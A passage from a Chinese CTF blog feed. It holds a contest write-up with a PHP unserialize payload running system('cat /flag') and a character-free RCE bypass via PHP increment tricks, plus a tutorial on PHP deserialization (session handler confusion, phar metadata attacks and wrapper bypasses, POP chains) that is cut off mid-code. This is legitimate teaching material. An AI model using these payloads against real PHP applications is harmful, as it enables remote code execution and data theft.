src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/10.png"></p><p>所以直接双写绕过拿到flag！这也是本人作为菜鸡第一次月赛唯一会的一道题！好菜呜呜！</p><h2 id="babycve"><a href="#babycve" class="headerlink" title="babycve"></a>babycve</h2><p>进入界面如下</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/12.png"></p><p>根据题目，知道是cve漏洞，然后根据网站，搜索cve Grafana即可找到相关文章。</p><p>做题参考如下：<a href="https://blog.csdn.net/qq_36197704/article/details/123480175">Grafana任意文件读取漏洞（CVE-2021-43798）_chaojixiaojingang的博客-CSDN博客_grafana漏洞</a></p><h2 id="babyunser"><a href="#babyunser" class="headerlink" title="babyunser"></a>babyunser</h2><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/11.png"></p><p>如图所示，读题并一眼看出是PHP反序列化，但并没有看到哪里有输出flag（菜鸡）！一顿审计下来，发现run函数调用，指向了$a和$b</p><p>所以，参考大佬思路，这是个远程执行，system(‘whoami’) ,所以$this→a&#x3D;system,$this→b&#x3D;whoami(即获取flag的指令  ‘cat &#x2F;flag’)</p><p>在没有获取flag之前，应该先找到flag ‘find &#x2F; name flag’</p><p>构造如下poc，获取payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class cwm</span><br><span class="line">    &#123;</span><br><span class="line">        public $a=&#x27;system&#x27;;</span><br><span class="line">        public $b=&#x27;cat /flag&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">echo serialize(new cwm());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后令url&#x2F;?NEUQCSA&#x3D; O:3:”cwm”:2:{s:1:”a”;s:6:”system”;s:1:”b”;s:9:”cat &#x2F;flag”;}  即可获取flag</p><h2 id="babyrce"><a href="#babyrce" class="headerlink" title="babyrce"></a>babyrce</h2><p>最后一道也是我认为最难的一道，无字符rce，即正则匹配把字符，数字，字母，全过滤了</p><p><img src="/2022/10/09/10%E6%9C%88%E6%A0%A1%E8%B5%9Bwp/13.png"></p><p>难点就是绕过正则。参考大佬思路（呜呜，好菜，根本不会）。利用php的自增操作来绕过正则匹配</p><h4 id="步骤1-数组的-x3D-操作-，目的-拿到任意的字母"><a href="#步骤1-数组的-x3D-操作-，目的-拿到任意的字母" class="headerlink" title="步骤1:数组的 .&#x3D;操作 ，目的:拿到任意的字母"></a>步骤1:数组的 .&#x3D;操作 ，目的:拿到任意的字母</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$_ = [];</span><br><span class="line">$_ .= [];</span><br><span class="line">var_dump($_);</span><br><span class="line">#用$_是因为变量名只能由_,字母,数字组成,</span><br><span class="line">#这里的结果是 string(10) &quot;ArrayArray&quot;</span><br><span class="line">#因为 .= 是字符串的操作,而$_是数组,因此php编辑器将$_由数组转化为了字符串Array</span><br><span class="line">#有两个array是因为 .=的操作拼接了两个数组</span><br><span class="line">$__ = $_[0];</span><br><span class="line">#这里的$__也就是字符A</span><br><span class="line">$__++;</span><br><span class="line">#此时的$__就是字符B了</span><br><span class="line">#需要注意的是在php中A++ = B;但是 Z++=AA</span><br><span class="line">#这是因为php用了phar语言的特性,具体的可以去翻下phpAPI手册</span><br><span class="line">#如果是C语言的话倒是可以</span><br></pre></td></tr></table></figure><h4 id="步骤2-chr-函数的使用-目的：拿到任意字符"><a href="#步骤2-chr-函数的使用-目的：拿到任意字符" class="headerlink" title="步骤2:chr()函数的使用,目的：拿到任意字符"></a>步骤2:chr()函数的使用,目的：拿到任意字符</h4><p>由于步骤1我们能拿到任意字母,但拿不到任意字符,如 _ 导致我们构不成 $_POST 因此有了步骤二 </p><p>想要拿到任意字符也很简单,利用chr()函数即可</p><p> chr(int) -&gt; 返回int对应的ascii值,如 chr(97) -&gt; a;chr(65) -&gt;A </p><p>由于php是弱语言,CHR()和chr()是一样的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#先得到chr</span><br><span class="line">$_ = [];</span><br><span class="line">$_ .= [];</span><br><span class="line">$__ = $_[0]; #$__ = A</span><br><span class="line">$__++;$__++; #$__=C,得到了字符C</span><br><span class="line">#H和R也是一样的</span><br><span class="line">#如果 $__ = CHR的话, $__(97) 就是a了,利用这个机制就可以拿到任意的字符</span><br><span class="line">#在这里发现个问题,每次手动写太麻烦了,因此我写了个python脚本来辅助,代码如下</span><br><span class="line">#使用说明:给test传两个参数,</span><br><span class="line">#第一个是str类型的,也就是你要转换的字符串,</span><br><span class="line">#第二个是int类型的,用于控制变量名,如$_1,$_2,$_33,方便我们控制变量</span><br><span class="line">#test函数外面的那个print中的内容就是使 $_1 = CHR</span><br><span class="line">str=&#x27;ASSERT&#x27;</span><br><span class="line">利用脚本拿到转化后的字符串,如图</span><br><span class="line">对 _GET优化下使其变成 $_GET</span><br><span class="line">整合后的payload</span><br><span class="line">此时还不能直接用,因为+ 在url编码中会变成空格,导致了自增失败,因此我们拿去url编码下</span><br><span class="line">url编码地址:CTF在线工具-在线URL编码|URL解码 (hiencode.com)</span><br><span class="line">编码后的payload</span><br><span class="line">str2=&#x27;_GET&#x27;</span><br><span class="line">def test(str,j):</span><br><span class="line">flag=1</span><br><span class="line">for i in str:</span><br><span class="line">temp = ord(i)</span><br><span class="line">if flag==1:</span><br><span class="line">print(&quot;$_&#123;&#125;=$_1(&#123;&#125;);&quot;.format(j,temp),end=&#x27;&#x27;)</span><br><span class="line">flag=2</span><br><span class="line">else:</span><br><span class="line">print(&quot;$_&#123;&#125;.=$_1(&#123;&#125;);&quot;.format(j,temp),end=&#x27;&#x27;)</span><br><span class="line">print(&quot;$_=</span><br><span class="line">[];$_.=$_;$_=$_[0];$__=$_;$__++;$__++;$___=$__;$__=$_;$__++;$__++;$__++;$__++;$_</span><br><span class="line">_++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++</span><br><span class="line">;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$_1=$___;&quot;,end=</span><br><span class="line">&quot;&quot;)</span><br><span class="line">test(str,2)</span><br><span class="line">test(str2,3)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化问题总结</title>
      <link href="/2022/10/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/2022/10/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><hr><h3 id="1-序列化：将变量（通常是数组和对象）转换为可保存或传输的字符串"><a href="#1-序列化：将变量（通常是数组和对象）转换为可保存或传输的字符串" class="headerlink" title="1 序列化：将变量（通常是数组和对象）转换为可保存或传输的字符串"></a>1 <strong>序列化</strong>：将变量（通常是数组和对象）转换为可保存或传输的字符串</h3><h3 id="2-反序列化：在适当的时候把这个字符串再转化成原来的变量（通常是数组和对象）使用。"><a href="#2-反序列化：在适当的时候把这个字符串再转化成原来的变量（通常是数组和对象）使用。" class="headerlink" title="2 反序列化：在适当的时候把这个字符串再转化成原来的变量（通常是数组和对象）使用。"></a><strong>2 反序列化</strong>：在适当的时候把这个字符串再转化成原来的变量（通常是数组和对象）使用。</h3><p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。反序列化本身不是漏洞，但如果反序列化的内容可控，就容易导致漏洞</p><h3 id="3-常用函数"><a href="#3-常用函数" class="headerlink" title="3 常用函数"></a>3 常用函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__construct()  <span class="comment">//当对象创建时触发</span></span><br><span class="line">__destruct()   <span class="comment">//当对象销毁时触发</span></span><br><span class="line">__wakeup()     <span class="comment">//当使用unserialize时触发，先会调用这个函数</span></span><br><span class="line">__sleep()     <span class="comment">//当使用serialize时触发，先会调用这个函数</span></span><br><span class="line">__destruct()  <span class="comment">//当对象被销毁时触发</span></span><br><span class="line">__call()      <span class="comment">//当对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get()       <span class="comment">//当访问不可访问或不存在的属性时触发</span></span><br><span class="line">__set()       <span class="comment">//当设置不可访问或不存在属性时触发</span></span><br><span class="line">__toString()  <span class="comment">//当把类当作字符串使用时触发  echo或者拼接字符串或者其他隐式调用该方法的操作都会触发</span></span><br><span class="line">__invoke() <span class="comment">//当尝试将对象调用为函数时触发</span></span><br><span class="line">__callStatic  <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__isset()     <span class="comment">//当对不可访问属性调用isset()或empty()时调用</span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br></pre></td></tr></table></figure><p>这是一个反序列化结果：  &#x2F;&#x2F;O:4:”Test”:2:{s:4:”test”;s:2:”ok”;s:3:”var”;N;}</p><p>O代表这是一个对象，4代表对象名称的长度，2代表成员(对象属性)个数。 “Test”代表类的名称（也叫对象名）<br>大括号中分别是：属性名类型、长度、名称;属性值类型、长度、值。“test”代表属性名称</p><p><img src="/2022/10/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/6.png"></p><p>另附一份详情表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a - array 数组型</span><br><span class="line">b - boolean 布尔型</span><br><span class="line">d - double 浮点型</span><br><span class="line">i - integer 整数型</span><br><span class="line">o - common object 共同对象</span><br><span class="line">r - objec reference 对象引用</span><br><span class="line">s - non-escaped binary string 非转义的二进制字符串</span><br><span class="line">S - escaped binary string 转义的二进制字符串</span><br><span class="line">C - custom object 自定义对象</span><br><span class="line">O - class 对象</span><br><span class="line">N - null 空</span><br><span class="line">R - pointer reference 指针引用</span><br><span class="line">U - unicode string Unicode 编码的字符串</span><br></pre></td></tr></table></figure><p><strong>要点：</strong></p><ol><li><code>序列化只序列属性，不序列方法</code></li><li>因为序列化不序列方法，所以反序列化之后如果想正常使用这个对象的话我们必须要依托这个类要在当前作用域存在的条件</li><li>我们能控制的只有类的属性，攻击就是寻找合适能被控制的属性，利用作用域本身存在的方法，基于属性发动攻击</li></ol><p><strong>注意</strong>：1 反序列时需要注意私有的、被保护的属性被序列化的时候属性值会变成%00*%00属性名（受保护的）。</p><p>所以在构造a参数值的时候，注意序列化后的结构（可能%00类名%00属性名：私有的）</p><p>可以看到<code>protected</code>属性序列化之后的属性名前会多出个<code>\00*\00</code>或者写成<code>%00*%00</code></p><p>可以看到<code>private</code>属性序列化之后会在属性名前加上类名<code>People</code>，而且在类名的两侧会加上<code>\00</code>或者说<code>%00</code></p><p>2 如果类中同时定义了 unserialize() 和 wakeup() 两个魔术方法， 则只有 unserialize() 方法会生效，wakeup() 方法会被忽略。</p><h3 id="4-Session序列化问题"><a href="#4-Session序列化问题" class="headerlink" title="4 Session序列化问题"></a>4 Session序列化问题</h3><h4 id="session的存储机制"><a href="#session的存储机制" class="headerlink" title="session的存储机制"></a>session的存储机制</h4><p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。<br>存储的文件是以sess_sessionid来进行命名的</p><ul><li><code>php</code> : 默认使用方式，格式： 键名|键值(经过序列化函数处理的值)</li><li><code>php_serialize</code>: 格式 ：经过序列化函数处理的值 （php &gt; &#x3D;5.5.4)）</li><li><code>php_binary</code>: 键名的长度对应的ASCII字符 + 键名 + 经过序列化函数处理的值</li></ul><h4 id="php-ini中一些session配置"><a href="#php-ini中一些session配置" class="headerlink" title="php.ini中一些session配置"></a>php.ini中一些session配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=“” --设置session的存储路径</span><br><span class="line">session.save_handler=“”–设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.auto_start boolen–指定会话模块是否在请求开始时启动一个会话默认为0不启动</span><br><span class="line">session.serialize_handler string–定义用来序列化/反序列化的处理器名字。默认使用p</span><br></pre></td></tr></table></figure><p><strong>当存储是php_serialize处理，然后调用时php去处理</strong><br>如果这时候注入的数据是<code>a=|O:4:&quot;test&quot;:0:&#123;&#125;</code><br>那么session中的内容是<code>a:1:&#123;s:1:&quot;a&quot;;s:16:&quot;|O:4:&quot;test&quot;:0:&#123;&#125;&quot;;&#125;</code><br>根据解释,其中<code>a:1:&#123;s:1:&quot;a&quot;;s:16:&quot;</code>在经过php解析后是被看成键名,后面就是一个实例化test对象的注入。</p><p>可能有萌新不太懂，这里解释一下：<code>a:1</code>是使用php_serialize进行序列话都会加上  s:1:”a”表示键名 a的序列化内容！</p><p><strong>注意</strong>：4在ASCII表中对应的就是<code>EOT</code>。根据php_binary的存储规则，突然发现ASCII的值为4的字符无法在网页上面显示。例如键名是name这种情况。</p><p>以一道例题来讲解一下session反序列化</p><h3 id="5-Phar反序列化问题"><a href="#5-Phar反序列化问题" class="headerlink" title="5 Phar反序列化问题"></a>5 Phar反序列化问题</h3><p>phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容</p><p>如何生成一个phar文件呢？举个例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Test &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $o = new Test();</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h4><ol><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤</li></ol><h4 id="受影响的函数"><a href="#受影响的函数" class="headerlink" title="受影响的函数"></a>受影响的函数</h4><p>知道创宇测试后受影响的函数列表：</p><p><img src="https://img-blog.csdnimg.cn/20210203104957480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>实际上不止这些，也可以参考这篇链接，里面有详细说明<a href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>当环境限制了phar不能出现在前面的字符里。可以使用<code>compress.bzip2://</code>和<code>compress.zlib://</code>等绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line">php://filter/resource=phar:///test.phar/test.txt</span><br></pre></td></tr></table></figure><p>当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phar:&#x2F;&#x2F;phar.phar</p><p>GIF格式验证可以通过在文件头部添加GIF89a绕过<br>1、$phar-&gt;setStub(“GIF89a”.“<?php __HALT_COMPILER(); ?>”); &#x2F;&#x2F;设置stub<br>2、生成一个phar.phar，修改后缀名为phar.gif</p><h3 id="6-POP链子类问题"><a href="#6-POP链子类问题" class="headerlink" title="6 POP链子类问题"></a>6 POP链子类问题</h3><p>以2022年9月的NewStarCTF week 2的Unseralize为例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上面所示，很明显就是一道php反序列化构造pop链的题，这类题首先我们需要做的就是观察我们的最终目的是要调用哪个函数，在此题中很明显有个关键语句： **echo file_get_contents(‘&#x2F;flag’);**所以我们最终目的便是要触发Sec类里的__invoke魔术方法即可获取flag。</p><p>pop链构造题中最常见的入口就是__destruct()，此函数在对象销毁时立刻触发（可以直接理解为new该对象时直接触发该方法），所以我们第一步便是创建一个变量实现Start类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br></pre></td></tr></table></figure><p>此时会触发__destruct()函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> 可以看到 echo 了 name 这个属性，所以此时若把name实例化成一个对象，且该对象含有__toString()时就可以触发该魔术方法，所以我们寻找含有该魔术方法的类即Sec类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lass Sec&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 跟进**__toString()<strong>，可以发现调用了</strong>obj<strong>的</strong>check()<strong>方法，而</strong>__call()<strong>刚好是调用一个对象中无法利用的方法或者不存在的方法时触发，</strong>Easy**类中就有这个魔术方法</p><p>所以我们把<strong>obj</strong>实例化为一个<strong>Easy</strong>类的对象 </p><p>因此第三步为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span>-&gt;name-&gt;obj = <span class="keyword">new</span> <span class="title class_">Easy</span>();</span><br></pre></td></tr></table></figure><p>跟进**__call()<strong>，可以发现调用了</strong>clone<strong>，因此我们直接去找哪个类含有</strong>__clone()<strong>方法，可以发现</strong>eeee**类有此方法：</p><p>因此我们要把<strong>var</strong>这个变量实例化为一个<strong>eeee</strong>的对象</p><p>因此第四步为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span> = <span class="keyword">new</span> <span class="title function_ invoke__">eeee</span>(); </span><br></pre></td></tr></table></figure><p> 跟进**__clone()<strong>，可以发现调用了</strong>isset()<strong>方法，因此我们直接找哪个类含有</strong>__isset()<strong>，可以发现</strong>Start<strong>类有此方法且</strong>Start<strong>类中无法调用</strong>cmd<strong>属性(因为不存在)，因此要把</strong>eeee<strong>对象中的obj属性实例化为一个</strong>Start**对象：</p><p> 因此第五步为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span>-&gt;name-&gt;<span class="keyword">var</span>-&gt;obj = <span class="keyword">new</span> <span class="title 